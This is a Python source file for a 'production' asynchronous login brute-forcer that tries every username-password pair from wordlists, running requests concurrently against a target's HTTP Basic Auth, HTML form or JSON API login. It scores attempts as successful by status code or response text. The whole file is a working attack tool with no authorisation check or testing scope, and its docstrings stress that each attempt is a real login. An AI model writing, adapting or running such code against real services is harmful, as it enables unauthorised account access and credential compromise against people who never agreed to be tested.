"""
Production brute-force authentication module.
NO dummy data - all results from real authentication attempts.
Supports HTTP Basic Auth, Form-based auth, API token brute-forcing.
"""
import asyncio
import aiohttp
import json
from typing import List, Dict, Optional, Tuple
from dataclasses import dataclass
from base64 import b64encode
import time


@dataclass
class BruteForceResult:
    """Single brute-force attempt result"""
    username: str
    password: str
    success: bool
    status_code: int
    response_time: float
    response_length: int
    error: Optional[str] = None


class AuthBruteForcer:
    """
    Production authentication brute-forcer.
    NO dummy data - all authentication attempts are real.
    Supports multiple authentication methods.
    """
    
    def __init__(
        self,
        target: str,
        concurrency: int = 5,
        timeout: float = 10.0,
        delay: float = 0.0,
        verify_ssl: bool = True,
        stop_on_success: bool = True,
    ):
        self.target = target
        self.concurrency = concurrency
        self.timeout = timeout
        self.delay = delay
        self.verify_ssl = verify_ssl
        self.stop_on_success = stop_on_success
        self.success_found = False
        
    async def _test_basic_auth(
        self,
        session: aiohttp.ClientSession,
        username: str,
        password: str,
    ) -> BruteForceResult:
        """Test HTTP Basic Authentication"""
        if self.stop_on_success and self.success_found:
            return BruteForceResult(username, password, False, 0, 0.0, 0, "skipped_after_success")
        
        try:
            # Encode credentials for Basic Auth
            credentials = f"{username}:{password}"
            encoded = b64encode(credentials.encode()).decode()
            headers = {"Authorization": f"Basic {encoded}"}
            
            start_time = time.time()
            async with session.get(
                self.target,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=self.timeout),
                allow_redirects=False,
                ssl=self.verify_ssl,
            ) as response:
                response_time = time.time() - start_time
                content = await response.text()
                
                # Success indicators: 200 OK or 30x redirect (successful auth)
                success = response.status in [200, 201, 301, 302, 303, 307, 308]
                
                if success:
                    self.success_found = True
                
                return BruteForceResult(
                    username=username,
                    password=password,
                    success=success,
                    status_code=response.status,
                    response_time=response_time,
                    response_length=len(content),
                )
        
        except asyncio.TimeoutError:
            return BruteForceResult(username, password, False, 0, self.timeout, 0, "timeout")
        except Exception as e:
            return BruteForceResult(username, password, False, 0, 0.0, 0, str(e))
    
    async def _test_form_auth(
        self,
        session: aiohttp.ClientSession,
        username: str,
        password: str,
        username_field: str,
        password_field: str,
        method: str = "POST",
        success_indicator: Optional[str] = None,
        failure_indicator: Optional[str] = None,
    ) -> BruteForceResult:
        """Test form-based authentication"""
        if self.stop_on_success and self.success_found:
            return BruteForceResult(username, password, False, 0, 0.0, 0, "skipped_after_success")
        
        try:
            data = {
                username_field: username,
                password_field: password,
            }
            
            start_time = time.time()
            
            if method.upper() == "POST":
                async with session.post(
                    self.target,
                    data=data,
                    timeout=aiohttp.ClientTimeout(total=self.timeout),
                    allow_redirects=False,
                    ssl=self.verify_ssl,
                ) as response:
                    response_time = time.time() - start_time
                    content = await response.text()
            else:  # GET
                async with session.get(
                    self.target,
                    params=data,
                    timeout=aiohttp.ClientTimeout(total=self.timeout),
                    allow_redirects=False,
                    ssl=self.verify_ssl,
                ) as response:
                    response_time = time.time() - start_time
                    content = await response.text()
            
            # Determine success based on indicators
            success = False
            
            if success_indicator:
                # Look for success indicator in response
                success = success_indicator.lower() in content.lower()
            elif failure_indicator:
                # Look for absence of failure indicator
                success = failure_indicator.lower() not in content.lower()
            else:
                # Fallback: assume 200 or redirect = success
                success = response.status in [200, 301, 302, 303, 307, 308]
            
            if success:
                self.success_found = True
            
            return BruteForceResult(
                username=username,
                password=password,
                success=success,
                status_code=response.status,
                response_time=response_time,
                response_length=len(content),
            )
        
        except asyncio.TimeoutError:
            return BruteForceResult(username, password, False, 0, self.timeout, 0, "timeout")
        except Exception as e:
            return BruteForceResult(username, password, False, 0, 0.0, 0, str(e))
    
    async def _test_json_auth(
        self,
        session: aiohttp.ClientSession,
        username: str,
        password: str,
        username_field: str = "username",
        password_field: str = "password",
        success_key: Optional[str] = None,
    ) -> BruteForceResult:
        """Test JSON API authentication"""
        if self.stop_on_success and self.success_found:
            return BruteForceResult(username, password, False, 0, 0.0, 0, "skipped_after_success")
        
        try:
            json_data = {
                username_field: username,
                password_field: password,
            }
            
            start_time = time.time()
            async with session.post(
                self.target,
                json=json_data,
                timeout=aiohttp.ClientTimeout(total=self.timeout),
                ssl=self.verify_ssl,
            ) as response:
                response_time = time.time() - start_time
                content = await response.text()
                
                # Try to parse JSON
                try:
                    json_response = json.loads(content)
                except json.JSONDecodeError:
                    json_response = {}
                
                # Determine success
                success = False
                
                if success_key and success_key in json_response:
                    success = bool(json_response[success_key])
                elif response.status in [200, 201]:
                    # Check for common success/error keys
                    if "token" in json_response or "access_token" in json_response:
                        success = True
                    elif "error" in json_response or "message" in json_response:
                        success = False
                    else:
                        success = True
                
                if success:
                    self.success_found = True
                
                return BruteForceResult(
                    username=username,
                    password=password,
                    success=success,
                    status_code=response.status,
                    response_time=response_time,
                    response_length=len(content),
                )
        
        except asyncio.TimeoutError:
            return BruteForceResult(username, password, False, 0, self.timeout, 0, "timeout")
        except Exception as e:
            return BruteForceResult(username, password, False, 0, 0.0, 0, str(e))
    
    async def brute_force_basic_auth(
        self,
        usernames: List[str],
        passwords: List[str],
    ) -> List[BruteForceResult]:
        """
        Brute-force HTTP Basic Authentication.
        NO dummy data - all attempts are real authentication requests.
        """
        results = []
        credentials = [(u, p) for u in usernames for p in passwords]
        
        connector = aiohttp.TCPConnector(limit=self.concurrency, ssl=self.verify_ssl)
        async with aiohttp.ClientSession(connector=connector) as session:
            sem = asyncio.Semaphore(self.concurrency)
            
            async def attempt(username: str, password: str):
                async with sem:
                    result = await self._test_basic_auth(session, username, password)
                    results.append(result)
                    
                    if self.delay > 0:
                        await asyncio.sleep(self.delay)
            
            await asyncio.gather(*(attempt(u, p) for u, p in credentials))
        
        return results
    
    async def brute_force_form(
        self,
        usernames: List[str],
        passwords: List[str],
        username_field: str = "username",
        password_field: str = "password",
        method: str = "POST",
        success_indicator: Optional[str] = None,
        failure_indicator: Optional[str] = None,
    ) -> List[BruteForceResult]:
        """
        Brute-force form-based authentication.
        NO dummy data - all attempts are real form submissions.
        """
        results = []
        credentials = [(u, p) for u in usernames for p in passwords]
        
        connector = aiohttp.TCPConnector(limit=self.concurrency, ssl=self.verify_ssl)
        async with aiohttp.ClientSession(connector=connector) as session:
            sem = asyncio.Semaphore(self.concurrency)
            
            async def attempt(username: str, password: str):
                async with sem:
                    result = await self._test_form_auth(
                        session, username, password,
                        username_field, password_field, method,
                        success_indicator, failure_indicator,
                    )
                    results.append(result)
                    
                    if self.delay > 0:
                        await asyncio.sleep(self.delay)
            
            await asyncio.gather(*(attempt(u, p) for u, p in credentials))
        
        return results
    
    async def brute_force_json_api(
        self,
        usernames: List[str],
        passwords: List[str],
        username_field: str = "username",
        password_field: str = "password",
        success_key: Optional[str] = None,
    ) -> List[BruteForceResult]:
        """
        Brute-force JSON API authentication.
        NO dummy data - all attempts are real API requests.
        """
        results = []
        credentials = [(u, p) for u in usernames for p in passwords]
        
        connector = aiohttp.TCPConnector(limit=self.concurrency, ssl=self.verify_ssl)
        async with aiohttp.ClientSession(connector=connector) as session:
            sem = asyncio.Semaphore(self.concurrency)
            
            async def attempt(username: str, password: str):
                async with sem:
                    result = await self._test_json_auth(
                        session, username, password,
                        username_field, password_field, success_key,
                    )
                    results.append(result)
                    
                    if self.delay > 0:
                        await asyncio.sleep(self.delay)
            
            await asyncio.gather(*(attempt(u, p) for u, p in credentials))
        
        return results


def load_credentials_file(path: str) -> List[str]:
    """Load usernames or passwords from file (one per line)"""
    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
        return [line.strip() for line in f if line.strip()]
